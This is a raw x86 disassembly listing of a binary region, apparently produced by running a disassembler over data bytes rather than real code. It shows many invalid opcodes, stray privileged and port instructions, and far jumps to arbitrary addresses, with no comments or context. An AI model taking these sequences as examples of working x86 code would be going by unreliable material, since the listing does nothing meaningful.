  40578e:	and    esp,DWORD PTR [edx+0x62]
  405791:	push   0xc1706866
  405796:	push   ds
  405797:	mov    eax,0xe67631c3
  40579c:	jecxz  0x40576e
  40579e:	inc    ebx
  40579f:	and    edi,esi
  4057a1:	pop    ds
  4057a2:	adc    esp,ebx
  4057a4:	cmp    bh,BYTE PTR [ebx]
  4057a6:	or     DWORD PTR ss:[edi+0x72c950e1],esi
  4057ad:	adc    BYTE PTR [edi-0x60e96669],0x17
  4057b4:	rol    ebx,1
  4057b6:	dec    ebp
  4057b7:	xor    DWORD PTR [eax+eax*1-0x14],eax
  4057bb:	xchg   esp,eax
  4057bc:	sub    edx,DWORD PTR [edi-0x47]
  4057bf:	fld    DWORD PTR [edx-0x69]
  4057c2:	pop    ss
  4057c3:	sub    eax,0xd3dc2efe
  4057c8:	imul   edi,DWORD PTR ds:0x6ce3612e,0xffffffaf
  4057cf:	mov    al,ds:0x45c4ab0e
  4057d4:	cld    
  4057d5:	sub    eax,0x2c9b9ec6
  4057da:	adc    eax,DWORD PTR [ecx+edx*1-0x482d6e9b]
  4057e1:	aad    0x4d
  4057e3:	cli    
  4057e4:	icebp  
  4057e5:	push   ds
  4057e6:	lock scas eax,DWORD PTR es:[edi]
  4057e8:	bnd jle 0x4057b3
  4057eb:	adc    DWORD PTR [eax+0x47],ebx
  4057ee:	retf   0x8a9
  4057f1:	jmp    0x19208f6c
  4057f6:	lahf   
  4057f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057f8:	mov    ds:0x3c7fd13,al
  4057fd:	bound  esp,QWORD PTR [ebp+esi*8-0x5d]
  405801:	repz repz inc ecx
  405804:	fchs   
  405806:	repz ja 0x4057bb
  405809:	and    DWORD PTR [ebx],edi
  40580b:	jmp    0xcb190f94
  405810:	jno    0x405814
  405812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405813:	mov    eax,ds:0x2db0535c
  405818:	jp     0x4057d0
  40581a:	outs   dx,BYTE PTR ds:[esi]
  40581b:	into   
  40581c:	jl     0x40586d
  40581e:	test   eax,0xc56cc676
  405823:	or     al,0x11
  405825:	in     eax,dx
  405826:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405827:	mov    esi,0x61ef57d1
  40582c:	mov    al,ds:0x71b9cbe3
  405831:	add    al,0x2b
  405833:	addr16 sbb eax,0x67064721
  405839:	push   esp
  40583a:	inc    esp
  40583b:	(bad)  
  40583c:	xor    al,0xa7
  40583e:	imul   eax,DWORD PTR [ecx-0x2175e10b],0x246988c2
  405848:	das    
  405849:	call   0x8a58:0x81cb4b5d
  405850:	push   esp
  405851:	std    
  405852:	imul   esp,edi,0xf4bddb48
  405858:	fsubr  QWORD PTR [esi+0x1be3f01]
  40585e:	sub    al,0x74
  405860:	xchg   edi,eax
  405861:	into   
  405862:	(bad)  
  405863:	in     eax,0xdf
  405865:	fst    QWORD PTR [ebx+0x676e8478]
  40586b:	pop    edx
  40586c:	adc    eax,0x761a3bea
  405871:	or     al,BYTE PTR [edi]
  405873:	scas   al,BYTE PTR es:[edi]
  405874:	pop    edi
  405875:	or     BYTE PTR [esi+0xa],bh
  405878:	add    al,0x52
  40587a:	or     BYTE PTR [eax],al
  40587c:	imul   eax,ebp,0x7b
  40587f:	jl     0x40582c
  405881:	and    eax,0x260caa69
  405886:	loope  0x405884
  405888:	shl    DWORD PTR [ebx-0x1de08d67],cl
  40588e:	clc    
  40588f:	sbb    dl,BYTE PTR [edx-0x5342380d]
  405895:	jmp    0x1e82fda
  40589a:	lea    esi,ds:0xa3242228
  4058a0:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4058a2:	rcl    BYTE PTR [edx+esi*8+0x5a0d7f1],0x4e
  4058aa:	jp     0x4058cc
  4058ac:	jno    0x405848
  4058ae:	xchg   ebx,eax
  4058af:	(bad)  
  4058b0:	cdq    
  4058b1:	outs   dx,DWORD PTR ds:[esi]
  4058b2:	stos   BYTE PTR es:[edi],al
  4058b3:	or     DWORD PTR [edx+0xa81d92b],esp
  4058b9:	pop    ebx
  4058ba:	sub    esi,eax
  4058bc:	inc    esp
  4058bd:	or     DWORD PTR [edi-0x66],0x8ac3b3fd
  4058c4:	dec    esi
  4058c5:	aad    0x4d
  4058c7:	and    al,0x2c
  4058c9:	js     0x40589c
  4058cb:	mov    bl,0x96
  4058cd:	int3   
  4058ce:	xchg   ecx,eax
  4058cf:	add    esi,DWORD PTR [edi]
  4058d1:	ret    0xdbb2
  4058d4:	xchg   ebx,eax
  4058d5:	sahf   
  4058d6:	mov    dl,0x9c
  4058d8:	xchg   esi,eax
  4058d9:	inc    esp
  4058da:	aas    
  4058db:	pop    es
  4058dc:	sub    bh,BYTE PTR [edx-0x76]
  4058df:	pop    edx
  4058e0:	jbe    0x405869
  4058e2:	sbb    al,0x6a
  4058e4:	test   BYTE PTR [edi+0x4407c948],0x45
  4058eb:	mov    edi,0xf12bb03e
  4058f0:	push   edx
  4058f1:	push   ecx
  4058f2:	cmp    si,WORD PTR [ecx+eiz*4]
  4058f6:	scas   eax,DWORD PTR es:[edi]
  4058f7:	sbb    BYTE PTR [ebp-0x59],bl
  4058fa:	mov    dl,0x53
  4058fc:	xchg   esp,eax
  4058fd:	fs rol bh,0x99
  405901:	push   eax
  405902:	mov    esi,0x95d4ff2d
  405907:	or     dl,BYTE PTR [ecx+0x70]
  40590a:	jns    0x40590d
  40590c:	jb     0x4058a6
  40590e:	push   esp
  40590f:	loope  0x4058e7
  405911:	xchg   esi,eax
  405912:	in     al,dx
  405913:	mov    al,ds:0x62f4724e
  405918:	mov    ecx,DWORD PTR [edx+0x54]
  40591b:	sub    al,0x77
  40591d:	ja     0x405964
  40591f:	jo     0x4058c1
  405921:	sbb    ecx,esi
  405923:	mov    eax,ds:0xb5c6328d
  405928:	or     BYTE PTR [ecx],dh
  40592a:	pop    edi
  40592b:	nop
  40592c:	xor    eax,0x9118bc82
  405931:	ins    DWORD PTR es:[di],dx
  405933:	xchg   edi,ecx
  405935:	sub    bl,BYTE PTR [edx]
  405937:	mov    ds:0x7eda5e7e,al
  40593c:	(bad)  
  40593d:	and    BYTE PTR [edx],bh
  40593f:	mov    ds:0x9bed306f,al
  405944:	mov    ch,0x69
  405946:	xor    al,BYTE PTR [edx]
  405948:	lds    edx,FWORD PTR [edx+0x78887cfc]
  40594e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40594f:	loopne 0x40596c
  405951:	popf   
  405952:	sub    esp,DWORD PTR [edx-0x3e453d1e]
  405958:	add    ah,BYTE PTR [ebp+0x54]
  40595b:	mov    eax,0x98e821d4
  405960:	xchg   ebx,eax
  405961:	sbb    edi,eax
  405963:	mov    ebp,0x7dcc5742
  405968:	pusha  
  405969:	push   eax
  40596a:	pop    esp
  40596b:	or     ebp,DWORD PTR [ebx*2+0x2ce421eb]
  405972:	lock mov eax,ds:0xcf055c4d
  405978:	call   0xc08c124c
  40597d:	bound  esi,QWORD PTR [ebx-0x7e]
  405980:	add    dh,dl
  405982:	fdivr  QWORD PTR [ecx+0x5a60d8e5]
  405988:	and    ah,al
  40598a:	xor    DWORD PTR [esi-0xe],ebp
  40598d:	and    eax,0x8a49cce1
  405992:	or     ch,BYTE PTR [ebx]
  405994:	cmc    
  405995:	(bad)  
  405996:	cmp    edx,esi
  405998:	inc    eax
  405999:	rcr    BYTE PTR [ebx],0xcf
  40599c:	jmp    0xbed90c29
  4059a1:	ins    BYTE PTR es:[edi],dx
  4059a2:	scas   eax,DWORD PTR es:[edi]
  4059a3:	xor    al,0xf7
  4059a5:	sub    al,0x98
  4059a7:	jmp    0x92d06d6
  4059ac:	pop    es
  4059ad:	hlt    
  4059ae:	out    dx,eax
  4059af:	xchg   ecx,eax
  4059b0:	fdivr  DWORD PTR [esi]
  4059b2:	push   ss
  4059b3:	ret    0x5483
  4059b6:	inc    esp
  4059b7:	push   es
  4059b8:	inc    edi
  4059b9:	test   eax,0xd9329265
  4059be:	mov    bh,BYTE PTR [ecx-0x50]
  4059c1:	jnp    0x405a27
  4059c3:	cmp    al,0x7f
  4059c5:	jne    0x405950
  4059c7:	inc    edx
  4059c8:	in     eax,dx
  4059c9:	fist   DWORD PTR [esi]
  4059cb:	dec    ebp
  4059cc:	inc    esp
  4059cd:	and    ch,BYTE PTR [ecx-0x7aa3e85f]
  4059d3:	add    DWORD PTR [edx],esp
  4059d5:	xlat   BYTE PTR ds:[ebx]
  4059d6:	addr16 enter 0x799f,0x44
  4059db:	mov    cl,0x47
  4059dd:	jge    0x405a2c
  4059df:	stos   DWORD PTR es:[edi],eax
  4059e0:	outs   dx,DWORD PTR ds:[esi]
  4059e1:	mov    bh,0xb3
  4059e3:	pop    eax
  4059e4:	cmc    
  4059e5:	mov    gs,WORD PTR [ebp+0x51d0476]
  4059eb:	adc    BYTE PTR [edx],0xc3
  4059ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059ef:	pop    ss
  4059f0:	sahf   
  4059f1:	and    dh,BYTE PTR [edi+0x3b]
  4059f4:	in     al,dx
  4059f5:	xor    al,0x17
  4059f7:	leave  
  4059f8:	outs   dx,DWORD PTR ds:[esi]
  4059f9:	(bad)  
  4059fa:	mov    cl,0x9
  4059fc:	jbe    0x405a1a
  4059fe:	xor    ch,0x4b
  405a01:	xor    al,0x5b
  405a03:	mov    ecx,0x416636c7
  405a08:	mov    WORD PTR [esi],cs
  405a0a:	dec    ebx
  405a0b:	shr    DWORD PTR [ecx-0x41],0xaf
  405a0f:	pushf  
  405a10:	push   edx
  405a11:	push   eax
  405a12:	push   eax
  405a13:	out    dx,eax
  405a14:	aas    
  405a15:	push   cs
  405a16:	lahf   
  405a17:	in     eax,dx
  405a18:	jp     0x4059f8
  405a1a:	dec    ebx
  405a1b:	adc    al,0x58
  405a1d:	or     ah,BYTE PTR [edi-0x61]
  405a20:	scas   eax,DWORD PTR es:[edi]
  405a21:	xor    eax,0x17f7144a
  405a26:	jmp    0x6d1e:0x25fb23e
  405a2d:	add    dh,BYTE PTR [esi]
  405a2f:	mov    eax,ds:0x9445a0ed
  405a34:	jo     0x405a56
  405a36:	gs sahf 
  405a38:	into   
  405a39:	xchg   edx,eax
  405a3a:	enter  0x8c7f,0x9c
  405a3e:	mov    ecx,0x23bc0e62
  405a43:	mov    ebx,0xa0d661d8
  405a48:	push   ss
  405a49:	mov    ah,0x7
  405a4b:	test   eax,0x43a53a0c
  405a50:	imul   ebx,DWORD PTR [edx-0x5aa08227],0x72dc2286
  405a5a:	mov    ss,WORD PTR [ebp+0x2f]
  405a5d:	(bad)  
  405a5e:	xchg   ebp,eax
  405a5f:	mov    DWORD PTR [edi+0x5d],edi
  405a62:	mov    al,ds:0xe63542bf
  405a67:	jae    0x405a9a
  405a69:	dec    edx
  405a6a:	jp     0x4059f2
  405a6c:	pop    ebx
  405a6d:	and    al,0xf8
  405a6f:	xlat   BYTE PTR ds:[ebx]
  405a71:	js     0x405aa3
  405a73:	movhps xmm6,QWORD PTR ds:[eax*4+0x17ab141d]
  405a7c:	xchg   edx,eax
  405a7d:	sub    al,0x9b
  405a7f:	dec    esp
  405a80:	mov    eax,0x8b95be37
  405a85:	and    DWORD PTR [edx],eax
  405a87:	dec    edi
  405a88:	je     0x405a9e
  405a8a:	push   edi
  405a8b:	sahf   
  405a8c:	stos   BYTE PTR es:[edi],al
  405a8d:	push   0x809dfb63
  405a92:	cmp    BYTE PTR [esi],dl
  405a94:	ins    DWORD PTR es:[edi],dx
  405a95:	push   ds
  405a96:	mov    esi,0xa4cc6c5c
  405a9b:	out    dx,eax
  405a9c:	fcom   DWORD PTR [esi-0x475bc156]
  405aa2:	(bad)  
  405aa3:	aam    0x69
  405aa5:	clc    
  405aa6:	mul    DWORD PTR [esp+esi*4]
  405aa9:	es gs inc ebp
  405aad:	arpl   WORD PTR [eax],cx
  405aaf:	mov    ch,0x79
  405ab1:	mov    ecx,0x8ee80215
  405ab6:	dec    edx
  405ab7:	add    eax,0x72aa7f6d
  405abc:	and    DWORD PTR [edx-0x52b8169d],ecx
  405ac2:	retf   0xdccb
  405ac5:	int3   
  405ac6:	mov    edi,0x17b6464b
  405acb:	sub    al,0x24
  405acd:	cld    
  405ace:	adc    esi,eax
  405ad0:	in     al,0x8e
  405ad2:	mov    al,0x2d
  405ad4:	test   al,0x24
  405ad6:	test   eax,0x704087d8
  405adb:	cmp    edi,DWORD PTR [edx+0x7a]
  405ade:	mov    ebp,0x555613cf
  405ae3:	pop    es
  405ae4:	imul   BYTE PTR [eax+eax*2]
  405ae7:	sub    DWORD PTR [edx+edx*8+0x66],0xe6140373
  405aef:	fmul   DWORD PTR [edi-0x20029d4d]
  405af5:	push   esp
  405af6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405af7:	adc    DWORD PTR [esi],ecx
  405af9:	(bad)  
  405afa:	int    0xdc
  405afc:	xchg   edx,eax
  405afd:	cmp    eax,0x2d39b1d7
  405b02:	mov    cl,0xe0
  405b04:	pop    ds
  405b05:	and    eax,0xc2990f12
  405b0a:	aam    0x5d
  405b0c:	leave  
  405b0d:	stc    
  405b0e:	fisttp QWORD PTR [ebx-0x7e3d11c8]
  405b14:	lock or al,0x2c
  405b17:	xor    al,0x4e
  405b19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b1a:	mov    eax,0x6df8c52c
  405b1f:	retf   0xf98
  405b22:	leave  
  405b23:	pop    edx
  405b24:	sbb    al,0xa6
  405b26:	daa    
  405b27:	stos   DWORD PTR es:[edi],eax
  405b28:	push   esp
  405b29:	inc    eax
  405b2a:	xchg   esi,eax
  405b2b:	xor    bl,BYTE PTR [ecx+0x2f7ac1e8]
  405b31:	pop    edi
  405b32:	popa   
  405b33:	(bad)  
  405b35:	scas   eax,DWORD PTR es:[edi]
  405b36:	jae    0x405b1c
  405b38:	push   ebp
  405b39:	mov    ds:0x4026eb49,al
  405b3e:	call   0x5a12:0xd1f4adec
  405b45:	jo     0x405af9
  405b47:	add    bl,cl
  405b49:	inc    edi
  405b4a:	in     eax,dx
  405b4b:	mov    al,0xdd
  405b4d:	mov    ch,0xda
  405b4f:	adc    dh,BYTE PTR [ebx+edx*2+0x5aa9cc09]
  405b56:	outs   dx,DWORD PTR ds:[esi]
  405b57:	ds jp  0x405b4c
  405b5a:	or     eax,0x506c8435
  405b5f:	and    ch,cl
  405b61:	stos   BYTE PTR es:[edi],al
  405b62:	aad    0xbe
  405b64:	or     ch,BYTE PTR [ecx-0x32]
  405b67:	sub    ah,ah
  405b69:	mov    dh,0xbe
  405b6b:	sbb    DWORD PTR [ebx+0x6c],0xffffffe1
  405b6f:	mov    ah,0x20
  405b71:	ret    
  405b72:	scas   eax,DWORD PTR es:[edi]
  405b73:	pop    ds
  405b74:	pop    edx
  405b75:	icebp  
  405b76:	fstp   TBYTE PTR [eax-0x2ed8d0d8]
  405b7c:	in     al,0x9b
  405b7e:	gs xor al,0x42
  405b81:	mov    bl,0x14
  405b83:	fistp  WORD PTR [ebx+0x50134864]
  405b89:	jno    0x405b0e
  405b8b:	in     al,dx
  405b8c:	and    cl,BYTE PTR [ebx+ebp*1+0x66]
  405b90:	mov    ebp,0xdacc1a18
  405b95:	cmp    dl,dh
  405b97:	push   esi
  405b98:	xchg   BYTE PTR [edx+0x5a],dl
  405b9b:	sbb    al,0xd0
  405b9d:	ins    DWORD PTR es:[edi],dx
  405b9e:	rcr    bl,cl
  405ba0:	pop    esi
  405ba1:	lahf   
  405ba2:	jbe    0x405bf7
  405ba4:	mov    esi,edx
  405ba6:	loop   0x405b55
  405ba8:	ds mov ss,ebp
  405bab:	and    eax,0x97429f51
  405bb0:	sbb    DWORD PTR [esi],eax
  405bb2:	sbb    eax,0x186cd59d
  405bb7:	scas   eax,DWORD PTR es:[edi]
  405bb8:	xor    bh,ch
  405bba:	sub    bh,BYTE PTR [ebx]
  405bbc:	lock cmp al,0xa
  405bbf:	push   ebp
  405bc0:	enter  0x8e6,0xeb
  405bc4:	popf   
  405bc5:	(bad)
  405bc9:	int    0xa
  405bcb:	mov    ds:0x4db3dec8,eax
  405bd0:	push   ss
  405bd1:	push   es
  405bd2:	outs   dx,BYTE PTR ds:[esi]
  405bd3:	xor    edx,DWORD PTR [ebx+0x67024c0d]
  405bd9:	repz aas 
  405bdb:	(bad)  
  405bdc:	jmp    0xa34d6be
  405be1:	mov    ds:0xbdc5d4df,eax
  405be6:	jmp    0xbd47:0x4b5504e9
  405bed:	mov    eax,ds:0x8587e084
  405bf2:	sbb    edi,0xf54f556f
  405bf8:	sar    DWORD PTR [edx-0x15],0x5a
  405bfc:	push   ebp
  405bfd:	test   ebx,esi
  405bff:	sbb    BYTE PTR [edi+0x2260d8e1],bh
  405c05:	sub    DWORD PTR cs:[edi],esp
  405c08:	test   al,0xe2
  405c0a:	inc    ebp
  405c0b:	pushf  
  405c0c:	push   ecx
  405c0d:	hlt    
  405c0e:	int3   
  405c0f:	jne    0x405c0f
  405c11:	mov    ebp,0xfe2403ca
  405c16:	mov    al,0xe2
  405c18:	lea    esp,ds:0xbc030e50
  405c1e:	gs dec ecx
  405c20:	hlt    
  405c21:	mov    al,0x97
  405c23:	mov    dh,0xa4
  405c25:	and    ebp,0xfffffffa
  405c28:	test   al,0xa3
  405c2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c2b:	jp     0x405c4d
  405c2d:	push   0x36
  405c2f:	xor    BYTE PTR [edi+0x44],dl
  405c32:	shl    DWORD PTR [edi-0x6e],0x69
  405c36:	mov    BYTE PTR [esi],bl
  405c38:	repnz data16 adc BYTE PTR [ecx],al
  405c3c:	sbb    al,0x8d
  405c3e:	scas   al,BYTE PTR es:[edi]
  405c3f:	das    
  405c40:	dec    BYTE PTR [ebx-0x2c]
  405c43:	push   edi
  405c44:	lock mov ss,ecx
  405c47:	js     0x405be2
  405c49:	push   0xffffffec
  405c4b:	bound  edx,QWORD PTR [eax]
  405c4d:	fwait
  405c4e:	dec    ebx
  405c4f:	jle    0x405ca4
  405c51:	and    ch,BYTE PTR [eax+0x32652eea]
  405c57:	sar    BYTE PTR [eax+0x5248ad62],cl
  405c5d:	loope  0x405c41
  405c5f:	fadd   st,st(5)
  405c61:	sbb    al,0x75
  405c63:	add    al,0x2e
  405c65:	jl     0x405c65
  405c67:	or     DWORD PTR [esi-0x62],0x2d02b85c
  405c6e:	test   BYTE PTR [edx-0x13],bh
  405c71:	mov    eax,ds:0xf401d693
  405c76:	es push ebp
  405c78:	mov    esp,0x35404904
  405c7d:	(bad)  
  405c7e:	push   esi
  405c7f:	jae    0x405c02
  405c81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c82:	ja     0x405cb3
  405c84:	push   es
  405c85:	leave  
  405c86:	ja     0x405c56
  405c88:	hlt    
  405c89:	mov    ch,0x78
  405c8b:	cmp    eax,0xad2fea1a
  405c90:	nop
  405c91:	add    BYTE PTR [ebp*1+0x47ff8baf],ah
  405c98:	jno    0x405c79
  405c9a:	mov    cs,WORD PTR [eax]
  405c9c:	sbb    dh,al
  405c9e:	mov    ebp,0x9270613
  405ca3:	aas    
  405ca4:	add    ebx,DWORD PTR [edi-0x3d5c78e3]
  405caa:	test   DWORD PTR [edi-0x54d710fa],esp
  405cb0:	in     eax,dx
  405cb1:	dec    edi
  405cb2:	mov    ebx,0xab20d36d
  405cb7:	add    BYTE PTR [eax+eax*4],bl
  405cba:	xor    cl,ch
  405cbc:	std    
  405cbd:	(bad)  
  405cbe:	je     0x405c73
  405cc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cc1:	and    al,BYTE PTR [eax+0x12]
  405cc4:	adc    DWORD PTR [ecx*2+0xb820638],edi
  405ccb:	mov    DWORD PTR [ebx+0x51],edi
  405cce:	push   ebx
  405ccf:	jg     0x405d35
  405cd1:	(bad)  
  405cd2:	xchg   edi,eax
  405cd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cd4:	rol    dh,1
  405cd6:	or     DWORD PTR [eax],eax
  405cd8:	test   DWORD PTR [ebp-0x1d],0xe891fd7f
  405cdf:	xchg   dh,bl
  405ce1:	fprem1 
  405ce3:	and    esi,esp
  405ce5:	xor    bl,BYTE PTR [ebx]
  405ce7:	and    al,0xc7
  405ce9:	loope  0x405c7c
  405ceb:	cdq    
  405cec:	dec    edx
  405ced:	sbb    DWORD PTR [edi],ebx
  405cef:	sar    DWORD PTR [edx+0x5d],1
  405cf2:	add    al,BYTE PTR [ebx+0x30]
  405cf5:	dec    edi
  405cf6:	pop    ds
  405cf7:	pop    ebx
  405cf8:	mov    ds:0x17e26600,al
  405cfd:	inc    edx
  405cfe:	add    BYTE PTR [edi+0x7b],bl
  405d01:	cmp    cl,BYTE PTR [esi+0xd]
  405d04:	popa   
  405d05:	outs   dx,BYTE PTR ds:[esi]
  405d06:	or     eax,0x933f8fbd
  405d0b:	inc    eax
  405d0c:	jge    0x3e51d727
  405d12:	and    ecx,ebp
  405d14:	test   eax,0xc40fa42b
  405d19:	and    BYTE PTR [ecx+0x63f1e262],bl
  405d1f:	or     ebx,DWORD PTR [esi-0xf]
  405d22:	pop    ecx
  405d23:	push   0x26431867
  405d28:	in     al,dx
  405d29:	dec    esi
  405d2a:	jmp    0xc160:0x91670806
  405d31:	push   edx
  405d32:	jo     0x405d4d
  405d34:	or     cl,BYTE PTR [ebx+0x706d52ca]
  405d3a:	push   es
  405d3b:	jmp    0x419e:0xa8ed1d10
  405d42:	sub    al,0x6
  405d44:	rcr    BYTE PTR [esp+ebx*8-0x71],1
  405d48:	fucomi st,st(7)
  405d4a:	jecxz  0x405d97
  405d4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d4d:	int3   
  405d4e:	mov    al,0x0
  405d50:	or     BYTE PTR ds:0x725d3840,dl
  405d56:	mov    DWORD PTR ds:[ecx],edx
  405d59:	cmp    BYTE PTR [ecx+0x1f42c40],dh
  405d5f:	pop    ebx
  405d60:	jge    0x405d22
  405d62:	rcr    BYTE PTR [edx+0x47],1
  405d65:	xchg   BYTE PTR [ecx-0x1ba8ec13],cl
  405d6b:	imul   edx,eax,0xc3183692
  405d71:	jne    0x405def
  405d73:	fs add al,0x29
  405d76:	xchg   edx,eax
  405d77:	pop    bp
  405d79:	jmp    0x20a8:0x9108e3e1
  405d80:	pop    es
  405d81:	rcl    DWORD PTR [ebx+0x3e],cl
  405d84:	xor    esp,DWORD PTR [esi]
  405d86:	test   BYTE PTR [esi-0x237960d],bh
  405d8c:	pop    ecx
  405d8d:	mov    cl,0x78
  405d8f:	je     0x405d7c
  405d91:	idiv   BYTE PTR [ecx-0x6a]
  405d94:	sub    BYTE PTR [esi+ebx*2],ah
  405d97:	leave  
  405d98:	xchg   ecx,eax
  405d99:	fs fstp st(6)
  405d9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d9d:	out    dx,eax
  405d9e:	mov    esi,ds
  405da0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405da1:	jno    0x405d9a
  405da3:	fiadd  WORD PTR [edi]
  405da5:	lds    edx,FWORD PTR [edi]
  405da7:	rol    DWORD PTR [eax+0xa6e9ea0],cl
  405dad:	inc    eax
  405dae:	sbb    BYTE PTR [esi-0x2abe8b9b],bh
  405db4:	sub    bh,BYTE PTR [ebx-0x7a]
  405db7:	mov    dl,0xdd
  405db9:	lods   al,BYTE PTR ds:[esi]
  405dba:	ret    
  405dbb:	pop    esp
  405dbc:	cmp    ebp,DWORD PTR [esi]
  405dbe:	out    dx,eax
  405dbf:	(bad)  
  405dc0:	lds    ecx,FWORD PTR [ecx-0x7f]
  405dc3:	jno    0x405d76
  405dc5:	push   esp
  405dc6:	vcvtsd2ss xmm0,xmm3,QWORD PTR [edx]
  405dca:	dec    ebp
  405dcb:	aas    
  405dcc:	jne    0x405dfb
  405dce:	jmp    0xcdc82cf7
  405dd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dd4:	fist   WORD PTR [ebx+eiz*8+0x8e6fb83]
  405ddb:	adc    eax,0xabc8dd14
  405de0:	lea    eax,[esi]
  405de2:	jl     0x405e4f
  405de4:	dec    eax
  405de5:	add    DWORD PTR [esi-0x52906e5e],0x7d
  405dec:	ss not ch
  405def:	add    eax,0x7dc4bde2
  405df4:	jp     0x405da9
  405df6:	mov    ecx,0xb5f521c9
  405dfb:	push   edi
  405dfc:	push   edi
  405dfd:	cli    
  405dfe:	inc    esp
  405dff:	lds    ebp,FWORD PTR [edx+0x3ce8d9ac]
  405e05:	pop    ebx
  405e06:	xor    al,0xc2
  405e08:	push   DWORD PTR [esi-0xc]
  405e0b:	cmp    ch,BYTE PTR [eax]
  405e0d:	call   0xf9573568
  405e12:	loopne 0x405e7c
  405e14:	xor    al,0x60
  405e16:	xor    BYTE PTR gs:[edx+0x19],bl
  405e1a:	imul   DWORD PTR [edi]
  405e1c:	test   BYTE PTR [ebp+0x54],0x28
  405e20:	int    0x41
  405e22:	jne    0x405e31
  405e24:	addr16 adc eax,0xb8113a1f
  405e2a:	test   al,0x13
  405e2c:	ret    
  405e2d:	add    al,0x87
  405e2f:	mov    esi,0xfcd23a06
  405e34:	mov    ah,0x25
  405e36:	mov    dh,0x93
  405e38:	fisub  DWORD PTR ds:0xe2f7a4c5
  405e3e:	cmc    
  405e3f:	fs xor ah,dl
  405e42:	xchg   esp,eax
  405e43:	adc    al,0x42
  405e45:	std    
  405e46:	pop    ds
  405e47:	outs   dx,DWORD PTR ds:[esi]
  405e48:	jmp    0x405e79
  405e4a:	adc    BYTE PTR [ecx+0x1b],cl
  405e4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e4e:	es dec ecx
  405e50:	mov    cl,0xad
  405e52:	sbb    DWORD PTR [ebp+0xda90605],ecx
  405e58:	nop
  405e59:	pop    esi
  405e5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e5b:	sti    
  405e5c:	in     eax,0x21
  405e5e:	mov    esi,0x60302091
  405e63:	rcr    DWORD PTR [ebx],0x16
  405e66:	sbb    esp,edi
  405e68:	test   DWORD PTR [ecx],esp
  405e6a:	mul    BYTE PTR gs:[esp+eax*2]
  405e6e:	shl    BYTE PTR [edi-0x43],1
  405e71:	sub    al,0x7c
  405e73:	push   edx
  405e74:	jns    0x405e8b
  405e76:	out    0xc5,al
  405e78:	fcom   DWORD PTR [esi]
  405e7a:	stos   DWORD PTR es:[edi],eax
  405e7b:	not    ah
  405e7d:	mov    al,0x94
  405e7f:	test   DWORD PTR [ebp+0x46],edx
  405e82:	push   ecx
  405e83:	pop    ecx
  405e84:	pop    esp
  405e85:	inc    edi
  405e86:	push   0xea8c8d58
  405e8b:	adc    ecx,DWORD PTR [ebx+0x5]
  405e8e:	outs   dx,BYTE PTR ds:[esi]
  405e8f:	popf   
  405e90:	int    0x47
  405e92:	jb     0x405ed3
  405e94:	in     al,0xbf
  405e96:	mov    esp,0xae95ba65
  405e9b:	fucomi st,st(1)
  405e9d:	mov    ds,edx
  405e9f:	div    BYTE PTR [edx-0x63]
  405ea2:	xlat   BYTE PTR ds:[ebx]
  405ea3:	push   eax
  405ea4:	es jp  0x405eca
  405ea7:	dec    esi
  405ea8:	cmp    DWORD PTR cs:[ecx],esp
  405eab:	sub    dl,BYTE PTR [edi]
  405ead:	jnp    0x405e90
  405eaf:	int    0x4c
  405eb1:	mov    BYTE PTR [eax+0x74dd3b58],bh
  405eb7:	popf   
  405eb8:	mov    ds,WORD PTR [edi+0x1]
  405ebb:	popa   
  405ebc:	jbe    0x405eb2
  405ebe:	pusha  
  405ebf:	enter  0x2106,0x2f
  405ec3:	test   al,0x1c
  405ec5:	int    0x48
  405ec7:	int3   
  405ec8:	aas    
  405ec9:	retf   
  405eca:	mov    bl,0x42
  405ecc:	push   esi
  405ecd:	pop    esi
  405ece:	xor    BYTE PTR [ebp+0x7e],cl
  405ed1:	jno    0x405f22
  405ed3:	leave  
  405ed4:	lahf   
  405ed5:	adc    eax,0xbc914b4e
  405eda:	and    dh,BYTE PTR [esi+0x3d8bcbbc]
  405ee0:	or     eax,ecx
  405ee2:	cmp    ch,BYTE PTR [eax]
  405ee4:	mov    ah,0x5c
  405ee6:	scas   eax,DWORD PTR es:[edi]
  405ee7:	lods   al,BYTE PTR ds:[esi]
  405ee8:	sub    BYTE PTR [edx+eiz*2+0x375b3c4a],0x99
  405ef0:	mov    ecx,0xabdceeaa
  405ef5:	pop    esi
  405ef6:	xchg   esp,edi
  405ef8:	hlt    
  405ef9:	int    0x18
  405efb:	mov    BYTE PTR [esi-0x7a],bh
  405efe:	std    
  405eff:	mov    esp,0x28a00d0e
  405f04:	or     DWORD PTR [edi+0x3fe9fe7e],0xde2eae7c
  405f0e:	pop    ecx
  405f0f:	int    0x3c
  405f11:	or     ah,BYTE PTR [ebp-0x24]
  405f14:	jmp    0x405ea5
  405f16:	frstor [ebx+eax*2-0x6c]
  405f1a:	cmp    esp,DWORD PTR [edx+0x4d]
  405f1d:	xor    edi,ecx
  405f1f:	push   eax
  405f20:	aas    
  405f21:	push   ds
  405f22:	sub    BYTE PTR [esi],0x7e
  405f25:	push   0xbc73853f
  405f2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f2b:	mov    esp,DWORD PTR [ebx+0x46]
  405f2e:	dec    edx
  405f2f:	pop    esi
  405f30:	or     al,0xae
  405f32:	push   es
  405f33:	ds das 
  405f35:	loopne 0x405ee5
  405f37:	mov    dl,0xcf
  405f39:	cmp    al,BYTE PTR [edx-0x61b0f738]
  405f3f:	pop    edi
  405f40:	out    dx,al
